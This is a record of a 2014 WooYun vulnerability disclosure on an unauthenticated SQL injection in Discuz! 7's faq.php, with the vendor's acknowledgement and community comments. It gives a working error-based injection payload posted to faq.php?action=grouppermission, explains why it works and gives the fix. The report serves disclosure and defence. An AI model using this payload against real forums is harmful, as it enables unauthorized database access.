{"id": 1210, "wybug_id": "wooyun-2014-066095", "wybug_title": "Discuz7存在一处SQL注射漏洞（无需登录即可触发）", "wybug_corp": "Discuz!", "wybug_author": "Map", "wybug_date": "2014-06-24 18:29", "wybug_open_date": "2014-09-22 18:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向公众公开  简要描述： Disucz7 SQL注射漏洞。 详细说明：  在faq.php中使用的gids变量未被初始化。在180行有一句排序的代码：\nksort($gids);\n而后的代码是：\nforeach($gids as $row) { $groupids[] = $row[0];}\n$groupids[] = $row[0];这里取了foreach后的row数组的key 0。如果row是字符串的话，取的则是row的第一位。那么\n$query = $db->query(\"SELECT * FROM {$tablepre}usergroups u LEFT JOIN {$tablepre}admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (\".implodeids($groupids).\")\");\n会导致一个SQL注射漏洞。POST：\ngids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n到http://domain/faq.php?action=grouppermission就可以触发SQL注射了。当然，GET也可以。   漏洞证明：  漏洞有些小细节：例如\ngids[99]='&gids[100][0]=注射语句。\n为了让ksort后我们的注射语句能注射，那么注射语句的key一定要比破坏单引号的那个\\的key大一点。所以gids的第一个是99，第二个是100.另外，为了让单引号能被破坏掉，第一个的gids[99]是个字符串而不是数组，而gids[100]则必须得是数组。\n\n   修复方案：  初始化gids。   版权声明：转载请注明来源 Map@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-26 09:51 厂商回复： 感谢您指出的问题，我们会尽快处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-24 18:29 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  赞    \n     2014-06-24 18:30 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  火钳刘明    \n     2014-06-24 18:31 |    \t\tyes-i do \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | yes-i do)\t\t \n  mark    \n     2014-06-24 18:31 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  难得前排一次    \n     2014-06-24 18:32 |    \t\tKevini \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | =w=)\t\t \n  难得前排一次    \n     2014-06-24 18:40 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  mark    \n     2014-06-24 18:41 |    \t\t紫衣大侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:21        | 愿结天下有识之士)\t\t \n  叼。。    \n     2014-06-24 18:48 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  这么吊。    \n     2014-06-24 18:50 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  你这么叼你家里人知道吗？    \n     2014-06-24 18:53 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  刘明    \n     2014-06-24 19:15 |    \t\t记得 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 人 生 若 只 如 初 見)\t\t \n  打酱油    \n     2014-06-24 19:32 |    \t\tMelody \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 啊)\t\t \n  已关注，好屌好屌    \n     2014-06-24 19:53 |    \t\tYouYaX(乌云厂商)\t\t \n  指的7.2版本？？？    \n     2014-06-24 19:59 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  这是要发啊    \n     2014-06-24 20:13 |    \t\t小学猹 \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:30        | 暮春者，春服既成，冠者五六人，童子六七人...)\t\t \n  这是要发啊    \n     2014-06-24 20:28 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  膜拜    \n     2014-06-24 20:52 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  7.0版本么。。。    \n     2014-06-24 22:01 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  discuz这个词打错了。    \n     2014-06-24 22:16 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @Ray 好眼力    \n     2014-06-24 22:38 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-06-24 23:13 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  码    \n     2014-06-24 23:17 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  这漏洞牛逼~~求详情    \n     2014-06-24 23:43 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  mark    \n     2014-06-25 01:50 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  关注。。。    \n     2014-06-25 08:13 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  mark    \n     2014-06-25 09:09 |    \t\t蓝颜 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:29        )\t\t \n  火钳刘明    \n     2014-06-25 10:21 |    \t\tmaples \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        | 学习的小菜鸟)\t\t \n  牛逼咯    \n     2014-06-26 12:12 |    \t\t笨小猪 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | 杯壁下流)\t\t \n  MARK一下    \n     2014-06-27 07:24 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  牛逼 加入我们团队吧 codescan.cn    \n     2014-06-29 10:20 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:832 漏洞数:113        | 相濡以沫，不如相忘于江湖)\t\t \n  mark    \n     2014-06-29 14:08 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  火速关注    \n     2014-06-30 10:35 |    \t\t无面者 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | I'm a new man in security area.)\t\t \n  mark,洞主这是要发的节奏    \n     2014-06-30 12:20 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  这么叼！    \n     2014-07-02 12:37 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  哇....    \n     2014-07-02 18:43 |    \t\tFireweed \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:14        | Show me the #)\t\t \n  哇....     \n     2014-07-03 09:42 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  又是刷rank的节奏    \n     2014-07-03 10:13 |    \t\tFallenAngel \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 啊喔呃咿呜喻。。0.0)\t\t \n  mark    \n     2014-07-03 10:34 |    \t\tsec_jtn \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:56        | 本想无耻的刷rank，最后发现是我想太多了。...)\t\t \n  工具都到手了，漏洞还没公开？    \n     2014-07-03 22:03 |    \t\tsuperbing \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:29        | 常羡古时儿女怀，嘻戏千山好自在。)\t\t \n  http://blog.jiasule.com/wp-content/uploads/2014/07/QQ%E5%9B%BE%E7%89%87201406050047351.jpg  看这张图，能发现点什么不    \n     2014-07-04 06:48 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  faq    \n     2014-07-04 11:15 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  group_key    \n     2014-09-23 11:00 |    \t\t卡农的保镖 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 好)\t\t \n  以后DZ的我们怎么办！怎么办！    \n     2015-02-05 19:59 |    \t\twinalva \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | rank是什么？)\t\t \n  @sec_jtn 有工具么0.0    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}